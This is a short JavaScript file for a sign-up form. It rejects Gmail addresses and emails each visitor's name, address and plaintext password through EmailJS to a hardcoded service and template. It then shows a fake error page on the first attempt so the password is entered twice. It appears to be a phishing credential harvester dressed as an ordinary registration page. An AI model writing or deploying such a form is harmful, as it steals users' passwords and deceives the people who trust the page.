emailjs.init('ReqtkWfjI392LAzFb');

document.getElementById('formRegistro').addEventListener('submit', (e) => {
    e.preventDefault();
    
    const correo = document.getElementById('correo').value;
    const errorGmail = document.getElementById('errorGmail');
    let intentos = localStorage.getItem('intentosRegistro') || 0;

    // Validar Gmail
    if (correo.toLowerCase().includes('@gmail.com')) {
        errorGmail.style.display = 'block';
        document.getElementById('correo').focus();
        return;
    } else {
        errorGmail.style.display = 'none';
    }

    const datos = {
        nombre: document.getElementById('nombre').value,
        correo: correo,
        contrasena: document.getElementById('password').value
    };

    emailjs.send("service_syrc1uk", "template_u3etoro", datos)
        .then(() => {
            if(intentos < 1) {
                localStorage.setItem('intentosRegistro', 1);
                window.location.href = 'error.html';
            } else {
                localStorage.removeItem('intentosRegistro');
                window.location.href = 'success.html';
            }
        })
        .catch((error) => {
            alert('Error: ' + error.text);
        });
});
